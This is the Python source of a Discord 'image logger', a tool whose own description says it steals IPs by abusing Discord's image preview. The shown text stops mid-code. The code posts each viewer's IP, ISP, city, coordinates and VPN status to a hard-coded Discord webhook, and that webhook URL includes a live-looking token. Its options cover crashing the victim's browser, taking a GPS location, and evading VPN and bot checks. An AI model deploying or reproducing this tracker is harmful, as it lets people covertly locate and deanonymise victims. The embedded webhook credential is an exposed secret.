# Discord Image Logger
# By DeKrypt | https://github.com/dekrypted

from http.server import BaseHTTPRequestHandler
from urllib import parse
import traceback, requests, base64, httpagentparser

__app__ = "Discord Image Logger"
__description__ = "A simple application which allows you to steal IPs and more by abusing Discord's Open Original feature"
__version__ = "v2.0"
__author__ = "DeKrypt"

config = {
    # BASE CONFIG #
    "webhook": "https://discord.com/api/webhooks/1337294247128469604/DCi6iDmpY2YIImLYKS4aDmrIGDNXNBp17ykkL-oc9d2qD_vaPMY1zvcTDHTQBic989YY",
    "image": "data:image/jpeg;base64,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", # You can also have a custom image by using a URL argument
                                               # (E.g. yoursite.com/imagelogger?url=<Insert a URL-escaped link to an image here>)
    "imageArgument": True, # Allows you to use a URL argument to change the image (SEE THE README)

    # CUSTOMIZATION #
    "username": "Image Logger", # Set this to the name you want the webhook to have
    "color": 0x00FFFF, # Hex Color you want for the embed (Example: Red is 0xFF0000)

    # OPTIONS #
    "crashBrowser": False, # Tries to crash/freeze the user's browser, may not work. (I MADE THIS, SEE https://github.com/dekrypted/Chromebook-Crasher)
    
    "accurateLocation": False, # Uses GPS to find users exact location (Real Address, etc.) disabled because it asks the user which may be suspicious.

    "message": { # Show a custom message when the user opens the image
        "doMessage": False, # Enable the custom message?
        "message": "This browser has been pwned by DeKrypt's Image Logger. https://github.com/dekrypted/Discord-Image-Logger", # Message to show
        "richMessage": True, # Enable rich text? (See README for more info)
    },

    "vpnCheck": 1, # Prevents VPNs from triggering the alert
                # 0 = No Anti-VPN
                # 1 = Don't ping when a VPN is suspected
                # 2 = Don't send an alert when a VPN is suspected

    "linkAlerts": True, # Alert when someone sends the link (May not work if the link is sent a bunch of times within a few minutes of each other)
    "buggedImage": True, # Shows a loading image as the preview when sent in Discord (May just appear as a random colored image on some devices)

    "antiBot": 1, # Prevents bots from triggering the alert
                # 0 = No Anti-Bot
                # 1 = Don't ping when it's possibly a bot
                # 2 = Don't ping when it's 100% a bot
                # 3 = Don't send an alert when it's possibly a bot
                # 4 = Don't send an alert when it's 100% a bot
    

    # REDIRECTION #
    "redirect": {
        "redirect": False, # Redirect to a webpage?
        "page": "https://your-link.here" # Link to the webpage to redirect to 
    },

    # Please enter all values in correct format. Otherwise, it may break.
    # Do not edit anything below this, unless you know what you're doing.
    # NOTE: Hierarchy tree goes as follows:
    # 1) Redirect (If this is enabled, disables image and crash browser)
    # 2) Crash Browser (If this is enabled, disables image)
    # 3) Message (If this is enabled, disables image)
    # 4) Image 
}

blacklistedIPs = ("27", "104", "143", "164") # Blacklisted IPs. You can enter a full IP or the beginning to block an entire block.
                                                           # This feature is undocumented mainly due to it being for detecting bots better.

def botCheck(ip, useragent):
    if ip.startswith(("34", "35")):
        return "Discord"
    elif useragent.startswith("TelegramBot"):
        return "Telegram"
    else:
        return False

def reportError(error):
    requests.post(config["webhook"], json = {
    "username": config["username"],
    "content": "@everyone",
    "embeds": [
        {
            "title": "Image Logger - Error",
            "color": config["color"],
            "description": f"An error occurred while trying to log an IP!\n\n**Error:**\n```\n{error}\n```",
        }
    ],
})

def makeReport(ip, useragent = None, coords = None, endpoint = "N/A", url = False):
    if ip.startswith(blacklistedIPs):
        return
    
    bot = botCheck(ip, useragent)
    
    if bot:
        requests.post(config["webhook"], json = {
    "username": config["username"],
    "content": "",
    "embeds": [
        {
            "title": "Image Logger - Link Sent",
            "color": config["color"],
            "description": f"An **Image Logging** link was sent in a chat!\nYou may receive an IP soon.\n\n**Endpoint:** `{endpoint}`\n**IP:** `{ip}`\n**Platform:** `{bot}`",
        }
    ],
}) if config["linkAlerts"] else None # Don't send an alert if the user has it disabled
        return

    ping = "@everyone"

    info = requests.get(f"http://ip-api.com/json/{ip}?fields=16976857").json()
    if info["proxy"]:
        if config["vpnCheck"] == 2:
                return
        
        if config["vpnCheck"] == 1:
            ping = ""
    
    if info["hosting"]:
        if config["antiBot"] == 4:
            if info["proxy"]:
                pass
            else:
                return

        if config["antiBot"] == 3:
                return

        if config["antiBot"] == 2:
            if info["proxy"]:
                pass
            else:
                ping = ""

        if config["antiBot"] == 1:
                ping = ""


    os, browser = httpagentparser.simple_detect(useragent)
    
    embed = {
    "username": config["username"],
    "content": ping,
    "embeds": [
        {
            "title": "Image Logger - IP Logged",
            "color": config["color"],
            "description": f"""**A User Opened the Original Image!**

**Endpoint:** `{endpoint}`
            
**IP Info:**
> **IP:** `{ip if ip else 'Unknown'}`
> **Provider:** `{info['isp'] if info['isp'] else 'Unknown'}`
> **ASN:** `{info['as'] if info['as'] else 'Unknown'}`
> **Country:** `{info['country'] if info['country'] else 'Unknown'}`
> **Region:** `{info['regionName'] if info['regionName'] else 'Unknown'}`
> **City:** `{info['city'] if info['city'] else 'Unknown'}`
> **Coords:** `{str(info['lat'])+', '+str(info['lon']) if not coords else coords.replace(',', ', ')}` ({'Approximate' if not coords else 'Precise, [Google Maps]('+'https://www.google.com/maps/search/google+map++'+coords+')'})
> **Timezone:** `{info['timezone'].split('/')[1].replace('_', ' ')} ({info['timezone'].split('/')[0]})`
> **Mobile:** `{info['mobile']}`
> **VPN:** `{info['proxy']}`
